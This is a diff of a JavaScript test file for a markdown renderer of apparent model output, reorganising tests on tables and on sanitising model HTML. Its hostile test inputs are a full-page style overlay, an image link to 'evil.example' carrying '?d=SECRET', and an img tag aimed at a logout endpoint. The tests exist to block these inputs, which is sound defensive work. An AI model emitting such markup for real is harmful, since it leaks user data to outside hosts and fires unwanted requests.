@@ -12,24 +12,21 @@ globalThis.document = dom.window.document
 const { renderMarkdown, renderMarkdownSegments } = await import("../src/markdown.js")
 
 const TABLE = "| col | val |\n| --- | --- |\n| a | 1 |"
+const HEADERLESS = "| | |\n| --- | --- |\n| a | 1 |"
 
-test("a table renders inside the scroll wrapper", () => {
+test("a table renders inside one scroll wrapper, and an all-blank header row is dropped", () => {
 	const html = renderMarkdown(TABLE)
 	assert.match(html, /<div class="flow-md-table">\s*<table>/)
 	assert.match(html, /<\/table>\s*<\/div>/)
 	// one wrapper per table, not per row
 	assert.equal(html.match(/flow-md-table/g).length, 1)
+	assert.ok(html.includes("<thead>"))
+	const headerless = renderMarkdown(HEADERLESS)
+	assert.ok(!headerless.includes("<thead>"))
+	assert.match(headerless, /<tbody><tr>\s*<td>a<\/td>/)
 })
 
-test("an all-blank header row is dropped", () => {
-	const html = renderMarkdown("| | |\n| --- | --- |\n| a | 1 |")
-	assert.ok(!html.includes("<thead>"))
-	assert.match(html, /<tbody><tr>\s*<td>a<\/td>/)
-	assert.ok(renderMarkdown(TABLE).includes("<thead>"))
-	assert.ok(!renderMarkdownSegments("| | |\n| --- | --- |\n| a | 1 |")[0].html.includes("<thead>"))
-})
-
-test("the segmented renderer splits out top-level tables, unwrapped", () => {
+test("the segmented renderer splits out top-level tables, unwrapped; a nested table keeps its wrapper", () => {
 	const segments = renderMarkdownSegments(`intro\n\n${TABLE}\n\n\`\`\`js\ncode\n\`\`\``)
 	assert.deepEqual(
 		segments.map((segment) => segment.type),
@@ -37,27 +34,21 @@ test("the segmented renderer splits out top-level tables, unwrapped", () => {
 	)
 	assert.match(segments[1].html, /^<table>/)
 	assert.ok(!segments[1].html.includes("flow-md-table"))
-})
+	assert.ok(!renderMarkdownSegments(HEADERLESS)[0].html.includes("<thead>"))
 
-test("a nested table keeps its wrapper", () => {
-	const nested = TABLE.replace(/^/gm, "  ")
-	const segments = renderMarkdownSegments(`- item\n\n${nested}`)
+	const nested = renderMarkdownSegments(`- item\n\n${TABLE.replace(/^/gm, "  ")}`)
 	assert.deepEqual(
-		segments.map((segment) => segment.type),
+		nested.map((segment) => segment.type),
 		["html"],
 	)
-	assert.ok(segments[0].html.includes('class="flow-md-table"'))
+	assert.ok(nested[0].html.includes('class="flow-md-table"'))
 })
 
-test("model HTML keeps no styles or classes of its own", () => {
-	const html = renderMarkdown('<span style="position:fixed;inset:0">x</span> <div class="fixed inset-0 z-40">y</div>')
-	assert.ok(!html.includes("style="))
-	assert.ok(!html.includes("fixed"))
-	// the renderer's own table wrapper keeps its class
-	assert.match(renderMarkdown(TABLE), /class="flow-md-table"/)
-})
+test("model HTML can't restyle the page or load anything on render", () => {
+	const styled = renderMarkdown('<span style="position:fixed;inset:0">x</span> <div class="fixed inset-0 z-40">y</div>')
+	assert.ok(!styled.includes("style="))
+	assert.ok(!styled.includes("fixed"))
 
-test("nothing in model text loads on render: images become links, media goes", () => {
 	const html = renderMarkdown(
 		'![chart](https://evil.example/p.png?d=SECRET) <img src="/api/method/logout" srcset="https://e.x/b.png 2x">',
 	)
